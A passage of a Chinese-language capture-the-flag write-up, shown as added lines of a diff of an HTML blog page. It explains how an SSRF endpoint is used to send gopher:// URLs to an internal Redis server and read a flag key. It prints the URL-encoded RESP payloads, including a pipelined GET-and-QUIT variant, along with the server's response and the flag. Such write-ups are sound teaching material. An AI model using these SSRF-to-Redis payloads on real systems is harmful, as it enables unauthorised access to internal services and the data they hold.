+</div><p>确认 flag 存储在 Redis 的 <code>flag</code> 键中。</p>
+<p><strong>Step 5：用 gopher 协议访问 Redis（踩坑：连接超时）</strong></p>
+<p>Redis 使用 RESP 协议，不返回 HTTP 响应。用 gopher 发送简单命令：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">url=gopher://127.0.0.1:6379/_GET%20flag%0D%0A
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>返回 &ldquo;Operation timed out after 4002 milliseconds with <strong>49 bytes received</strong>&rdquo; — Redis 确实返回了数据（49 字节），但连接未关闭导致超时，SSRF 脚本不显示错误时的响应内容。</p>
+<p><strong>Step 6：使用 RESP 协议 + 流水线 QUIT 获取 flag（关键）</strong></p>
+<p>问题在于 Redis 保持连接等待更多命令。解决方案：使用 <strong>RESP 协议</strong> 发送命令并用 <strong>流水线（pipeline）</strong> 方式追加 QUIT 命令，让 Redis 执行完后主动关闭连接。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">url=gopher://127.0.0.1:6379/_%2A2%0D%0A%243%0D%0AGET%0D%0A%244%0D%0Aflag%0D%0A%2A1%0D%0A%244%0D%0AQUIT%0D%0A
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>URL 解码后的 RESP 数据：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">*2\r\n$3\r\nGET\r\n$4\r\nflag\r\n*1\r\n$4\r\nQUIT\r\n
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>服务端返回：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$42
+</span></span><span class="line"><span class="cl">flag{0f9d1155-c030-4996-9b7e-c0d999274f44}
+</span></span><span class="line"><span class="cl">+OK
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>其中 <code>$42</code> 是 RESP 协议的批量字符串长度前缀，<code>+OK</code> 是 QUIT 命令的响应。</p>
+<p><strong>⚠️ 关键踩坑点：</strong></p>
+<ol>
+<li><strong>连接超时问题</strong> — Redis 默认保持连接，gopher 发送单条命令后连接不关闭，SSRF 脚本超时不显示响应内容</li>
+<li><strong>解决方法</strong> — 在 RESP 流水线中追加 <code>QUIT</code> 命令（<code>*1\r\n$4\r\nQUIT\r\n</code>），Redis 执行完 GET 后处理 QUIT 主动关闭连接</li>
+<li><strong>RESP 协议格式</strong> — 必须使用 RESP 二进制协议（<code>*N\r\n$Len\r\n...</code>），不能用内联协议（<code>GET flag\r\n</code>），否则 Redis 可能无法正确解析</li>
+</ol>
+<p><strong>Flag：</strong> <code>flag{0f9d1155-c030-4996-9b7e-c0d999274f44}</code></p>
+<h2 id="ezjwt">EZJWT
 </h2><h3 id="ezjwt-1">EZJWT
 </h3><h3 id="ezjwt_1">EZJWT_1
 </h3><h3 id="ezjwt_2">EZJWT_2
